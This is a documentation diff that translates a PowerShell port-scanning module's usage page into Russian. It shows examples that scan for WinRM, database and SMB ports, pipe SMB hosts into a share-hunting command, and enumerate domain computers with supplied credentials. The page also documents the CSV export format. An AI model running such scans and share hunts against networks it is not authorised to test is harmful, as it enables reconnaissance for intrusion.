+# Узлы, на которых первый проход нашёл WinRM: проверка дополнительных портов
 Import-Csv .\open.csv | Where-Object Port -eq 5985 | Invoke-PortScan -Port 1-1024
 
-# The CSV as an address:port list, for tools that read one
+# CSV как перечень адрес:порт для других инструментов
 Import-Csv .\open.csv | ForEach-Object { "$($_.IPAddress):$($_.Port)" }
 
-# Servers of the domain, for databases
+# Серверы домена: проверка портов СУБД
 Get-DomainComputer -OperatingSystem '*Server*' | Invoke-PortScan -Port 1433,3306,5432
 
-# The hosts with SMB open, straight into the share hunt
+# Узлы с доступным SMB: передать в поиск общих ресурсов
 Invoke-PortScan -Target 10.1.2.0/24 -Port 445 -PassThru | Invoke-ShareHunt
 
-# The active computers of the domain - only when asked for
+# Активные компьютеры домена: только при явном запросе
 Invoke-PortScan -DomainComputers -Domain contoso.com -Credential (Get-Credential)
 ```
 
 ---
 
-**The CSV** (`-ExportOpenPorts`) has one row per open port and none for a host without one:
+**Формат CSV** (`-ExportOpenPorts`): одна строка на открытый порт, для узлов без открытых портов строк нет.
 
 ```
 "IPAddress","HostName","Port","Service"
@@ -892,14 +892,14 @@ Invoke-PortScan -DomainComputers -Domain contoso.com -Credential (Get-Credential
 "10.1.2.30","","22","SSH"
 ```
 
-It is comma-separated whatever the locale, so `Import-Csv` reads it on any machine. Excel set
-to a locale with a semicolon as list separator opens it in one column on a double click; *Data
-> From Text/CSV* reads it correctly.
+Независимо от региональных настроек CSV использует запятую, поэтому `Import-Csv` прочитает его на любом компьютере.
+Excel с региональным разделителем «точка с запятой» при двойном щелчке может открыть всё в одном
+столбце; импорт через *Данные > Из текста/CSV* разбирает файл корректно.
 
 ---
 
-## Navigation
+## Навигация
 
-- [Previous: Set- & New-Modules](07-Set-Modules.md)
-- [Next: Architecture](09-Architecture.md)
-- [Back to Home](00-Home.md)
+- [Назад: модули Set- и New-](07-Set-Modules.md)
+- [Далее: архитектура](09-Architecture.md)
+- [На главную](00-Home.md)
